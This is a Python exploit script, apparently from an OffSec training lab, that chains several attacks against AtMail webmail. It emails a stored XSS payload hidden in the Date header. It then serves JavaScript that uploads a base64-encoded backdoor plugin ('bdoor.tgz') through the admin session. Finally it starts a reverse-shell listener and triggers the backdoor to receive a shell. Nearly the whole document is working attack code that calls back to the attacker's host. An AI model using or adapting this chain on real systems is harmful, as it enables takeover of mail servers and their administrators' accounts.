#!/usr/bin/python

import smtplib, sys, requests, socket, time, threading
from http.server import HTTPServer, BaseHTTPRequestHandler


### SEND MALICIOUS PAYLOAD THROUGH E-MAIL USING SMTP

def sendMail(dstemail, frmemail, smtpsrv, payload):
   msg  = "From: attacker@offsec.local\n"
   msg += "To: admin@offsec.local\n"
   msg += "Date: %s\n" % payload
   msg += "Subject: There is a giftcard waiting fo you!\n"
   msg += "Content-type: text/html\n\n"
   msg += "Uh, dear admin. If you see this message, it is already late. U're pwnd."
   msg += '\r\n\r\n'

   server = smtplib.SMTP(smtpsrv)

   try:
       server.sendmail(frmemail, dstemail, msg)
       print("[+] Email sent!")

   except (Exception, e):
       print("[-] Failed to send email:")
       print("[*] " + str(e))

   server.quit()

dstemail = "admin@offsec.local"
frmemail = "attacker@offsec.local"

if not (dstemail and frmemail):
  sys.exit()

### START HTTP HANDLER TO SEND JS PAYLOAD

class S(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header("Content-type", "text/javascript")
        self.end_headers()

    def _html(self, message):
        content = '''function base64toBlob(base64Data, contentType) {{
    contentType = contentType || "";
    var sliceSize = 1024;
    var byteCharacters = atob(base64Data);
    var bytesLength = byteCharacters.length;
    var slicesCount = Math.ceil(bytesLength / sliceSize);
    var byteArrays = new Array(slicesCount);

    for (var sliceIndex = 0; sliceIndex < slicesCount; ++sliceIndex) {{
        var begin = sliceIndex * sliceSize;
        var end = Math.min(begin + sliceSize, bytesLength);

        var bytes = new Array(end - begin);
        for (var offset = begin, i = 0; offset < end; ++i, ++offset) {{
            bytes[i] = byteCharacters[offset].charCodeAt(0);
        }}
        byteArrays[sliceIndex] = new Uint8Array(bytes);
    }}
    return new Blob(byteArrays, {{ type: contentType }});
}}

//File contents encoded to Base64
var b64file = "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";
//Create a Blob object
var content_type = "application/x-compressed-tar";
var blob = base64toBlob(b64file, content_type);

//Append Blob to FormData
var formData = new FormData();
formData.append("newPlugin", blob,"bdoor.tgz");

//Send FormData to the server via XMLHttpRequest
var url = "http://{rsrv}:{rprt}/index.php/admin/plugins/preinstall";
var request = new XMLHttpRequest();
request.open("POST", url);
request.send(formData);
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://{rsrv}:{rprt}/index.php/admin/plugins/add/file/YmRvb3IudGd6", true);
xhr.send();
'''.format(rsrv=sys.argv[1],rprt=sys.argv[2])
        return content.encode("utf8")  # NOTE: must return a bytes object!

    def do_GET(self):
        self._set_headers()
        self.wfile.write(self._html("hi!"))

def run(server_class=HTTPServer, handler_class=S, addr="localhost", port="8000"): ##Made change; if would not work, change to localhost and port 8000
    server_address = (addr, port)
    httpd = server_class(server_address, handler_class)
    httpd.handle_request()

### REVERSE SHELL LISTENER

def listen(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, int(port)))
    s.listen(1)
    print("[+] Reverse shell listening on port " + str(port))
    conn, addr = s.accept()
    print('[+] Connection received from ',addr)
    while True:
        #Receive data from the target and get user input
        ans = conn.recv(1024).decode()
        sys.stdout.write(ans)
        command = input()

        #Send command
        command += "\n"
        conn.send(command.encode())
        time.sleep(1)

        #Remove the output of the "input()" function
        sys.stdout.write("\033[A" + ans.split("\n")[-1])

def getshell(rhost, rport, lhost, lport):
  print("[+] Sleeping 7 seconds to be sure everything ok")
  time.sleep(7)
  malurl="http://{}:{}/index.php?ip={}&port={}".format(rhost, rport, lhost, lport)
  print("[+] Sending request to get shell! {}".format(malurl))
  requests.get(malurl)



if __name__ == "__main__":
   if len(sys.argv) != 5:
       print("(+) usage: {} <RHOST> <RPORT> <LHOST> <LPORT>\n".format(sys.argv[0]))
       print("(+) RHOST - Remote server which runs vulnerable version of ATMAIL")
       print("(+) RPORT - Remote webmail port")
       print("(+) LHOST - Local IP Address to get shell")
       print("(+) LPORT - Local Port to get shell\n")
       sys.exit(-1)

   smtpsrv = sys.argv[1]
   rport = sys.argv[2]
   lhost = sys.argv[3]
   lport = sys.argv[4]
   payload = "<script src='http://{}/xss.js'></script>".format(lhost)
   print("[+] Sending Payload: {}".format(payload))
   sendMail(dstemail, frmemail, smtpsrv, payload) ##SEND E-mail
   print("[+] Payload successfully sent! Running http server to catch request.")
   print("[+] Waiting admin to open the gift in his inbox :)")
   listener_thread = threading.Thread(target=listen, args=(lhost, lport))
   listener_thread.start()
   run(addr=lhost, port=80)
   getshell(smtpsrv, rport, lhost, lport)
   listener_thread.join()
